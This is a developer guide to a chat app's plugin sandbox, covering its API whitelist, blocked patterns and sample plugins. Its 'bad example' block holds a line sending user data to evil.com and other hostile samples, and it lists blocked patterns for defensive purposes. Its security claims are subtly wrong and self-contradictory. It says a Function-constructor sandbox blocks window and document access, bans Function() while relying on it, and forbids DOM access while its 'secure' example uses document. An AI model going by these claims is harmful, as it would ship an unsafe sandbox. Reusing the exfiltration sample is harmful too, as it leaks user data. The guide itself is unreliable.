# Plugin Security Guidelines

## Overview

Claudia uses a secure plugin sandbox to execute plugin code safely. This document explains the security measures and guidelines for plugin development.

## What Changed?

**Before**: Plugins were executed using `eval()`, which was a critical security vulnerability allowing arbitrary code execution.

**Now**: Plugins run in a secure sandbox with restricted access to only whitelisted APIs.

## Security Features

### 1. Function-based Sandbox
Plugins now execute in a restricted scope using the Function constructor instead of `eval()`. This prevents access to global objects like `window`, `document`, and `process`.

### 2. API Whitelist
Plugins can only access the following ClaudiaPluginAPI methods:
- `registerHook(hookName, callback)` - Register hooks for chat events
- `registerSettingsUI(pluginId, callback)` - Add plugin settings UI
- `invoke(command, params)` - Call Tauri backend commands
- `getConfig(pluginId, key)` - Get plugin configuration
- `setConfig(pluginId, key, value)` - Set plugin configuration
- `log(pluginId, message)` - Log messages
- `error(pluginId, message)` - Log errors
- `getCurrentCharacter()` - Get active character
- `getChatHistory()` - Get chat history

### 3. Code Validation
Plugin code is validated before execution. The following patterns are **blocked**:

❌ **Forbidden Patterns**:
- `eval()` - Code execution
- `Function()` - Dynamic function creation
- `setTimeout('code')` - String-based timers
- `__proto__` - Prototype pollution
- `fetch()` - Direct network access (use `invoke()` instead)
- `XMLHttpRequest` - Direct XHR
- `localStorage` - Direct storage access (use `getConfig/setConfig`)
- `innerHTML =` - HTML injection
- Dynamic `import()`

### 4. No Access to DOM
Plugins cannot directly manipulate the DOM. All UI changes must go through the ClaudiaPluginAPI.

## Writing Secure Plugins

### ✅ Good Example

```javascript
// Secure plugin that modifies messages before sending
ClaudiaPluginAPI.registerHook('beforeMessageSend', async (message) => {
  // Log for debugging
  ClaudiaPluginAPI.log('my-plugin', `Processing message: ${message.length} chars`);

  // Get plugin config safely
  const enabled = await ClaudiaPluginAPI.getConfig('my-plugin', 'enabled');
  if (!enabled) return message;

  // Modify and return
  return message.toUpperCase();
});

// Register settings UI
ClaudiaPluginAPI.registerSettingsUI('my-plugin', (container) => {
  container.textContent = 'Plugin Settings';
  // Build UI safely
});
```

### ❌ Bad Example (Will be blocked)

```javascript
// ❌ Direct eval - BLOCKED
eval('alert("hacked")');

// ❌ Direct DOM access - BLOCKED
document.body.innerHTML = '<h1>Hacked</h1>';

// ❌ Direct network access - BLOCKED
fetch('https://evil.com/steal?data=' + userData);

// ❌ Direct localStorage - BLOCKED
localStorage.setItem('stolen', 'data');

// ❌ Prototype pollution - BLOCKED
Object.prototype.isAdmin = true;
```

## Available Hooks

Plugins can register callbacks for these hooks:

- `beforeMessageSend` - Modify message before sending
- `afterMessageReceive` - Process received messages
- `onMessageDisplay` - Modify message before display
- `onCharacterSwitch` - React to character changes
- `onSettingsUpdate` - React to settings changes

Example:
```javascript
ClaudiaPluginAPI.registerHook('afterMessageReceive', async (message) => {
  ClaudiaPluginAPI.log('my-plugin', 'Received: ' + message.content);
  return message; // Must return modified or original message
});
```

## Backend Integration

For plugins that need backend functionality, use the `invoke()` method:

```javascript
// Call a Tauri backend command
const result = await ClaudiaPluginAPI.invoke('your_custom_command', {
  param1: 'value',
  param2: 123
});
```

You'll need to add corresponding Rust commands in the Tauri backend.

## Plugin Configuration

Store plugin settings using the provided API:

```javascript
// Save config
ClaudiaPluginAPI.setConfig('my-plugin', 'apiKey', 'secret123');

// Load config
const apiKey = await ClaudiaPluginAPI.getConfig('my-plugin', 'apiKey');
```

## Testing Your Plugin

1. **Test in sandbox**: Your plugin will be validated before execution
2. **Check console**: Look for security warnings or errors
3. **Verify isolation**: Ensure your plugin doesn't affect other plugins
4. **Test error handling**: Make sure errors don't crash the app

## Migration Guide

If you have an existing plugin that used global APIs:

### Before:
```javascript
window.myData = 'something';
document.getElementById('chat').innerHTML = 'modified';
fetch('https://api.example.com/data').then(...);
```

### After:
```javascript
// Use plugin config instead of window
ClaudiaPluginAPI.setConfig('my-plugin', 'myData', 'something');

// Use hooks instead of direct DOM
ClaudiaPluginAPI.registerHook('onMessageDisplay', (data) => {
  data.modified = true;
  return data;
});

// Use invoke for backend calls
ClaudiaPluginAPI.invoke('fetch_external_data', {
  url: 'https://api.example.com/data'
});
```

## Reporting Security Issues

If you discover a security vulnerability in the plugin system or a malicious plugin, please report it to the maintainers immediately. Do not publish exploit details publicly.

## FAQ

**Q: Why can't I use `fetch()` directly?**
A: Direct network access bypasses security controls. Use `invoke()` to make the backend handle network requests with proper validation.

**Q: Can I load external scripts?**
A: No. Plugins must be self-contained. This prevents supply chain attacks.

**Q: What if I need functionality not in the API?**
A: Submit a feature request. We'll evaluate adding it to the whitelist if it's safe.

**Q: Will my old plugin still work?**
A: If it only used ClaudiaPluginAPI, yes. If it used direct DOM/window access, it needs migration.

## Security Checklist for Plugin Developers

- [ ] Only uses ClaudiaPluginAPI methods
- [ ] No direct DOM manipulation
- [ ] No `eval()`, `Function()`, or similar
- [ ] No direct network requests
- [ ] Validates all user inputs
- [ ] Handles errors gracefully
- [ ] Doesn't store sensitive data in config
- [ ] Tested in sandbox environment
- [ ] No infinite loops or blocking code
- [ ] Respects user privacy

## Example: Complete Secure Plugin

```javascript
// word-counter-plugin.js
// Counts words in messages and displays stats

(function() {
  'use strict';

  const PLUGIN_ID = 'word-counter';
  let wordCount = 0;

  // Hook into message display
  ClaudiaPluginAPI.registerHook('onMessageDisplay', async (message) => {
    try {
      const words = message.content.split(/\s+/).length;
      wordCount += words;

      // Store count
      await ClaudiaPluginAPI.setConfig(PLUGIN_ID, 'totalWords', wordCount);

      ClaudiaPluginAPI.log(PLUGIN_ID, `Total words: ${wordCount}`);

      return message; // Always return the message
    } catch (error) {
      ClaudiaPluginAPI.error(PLUGIN_ID, error.message);
      return message; // Return original on error
    }
  });

  // Register settings UI
  ClaudiaPluginAPI.registerSettingsUI(PLUGIN_ID, async (container) => {
    const count = await ClaudiaPluginAPI.getConfig(PLUGIN_ID, 'totalWords') || 0;

    const div = document.createElement('div');
    div.textContent = `Total words counted: ${count}`;

    const resetBtn = document.createElement('button');
    resetBtn.textContent = 'Reset Counter';
    resetBtn.onclick = () => {
      ClaudiaPluginAPI.setConfig(PLUGIN_ID, 'totalWords', 0);
      wordCount = 0;
      div.textContent = 'Counter reset!';
    };

    container.appendChild(div);
    container.appendChild(resetBtn);
  });

  ClaudiaPluginAPI.log(PLUGIN_ID, 'Word Counter Plugin loaded');
})();
```

---

**Last Updated**: 2025-11-07
**Version**: 2.0 (Secure Sandbox)
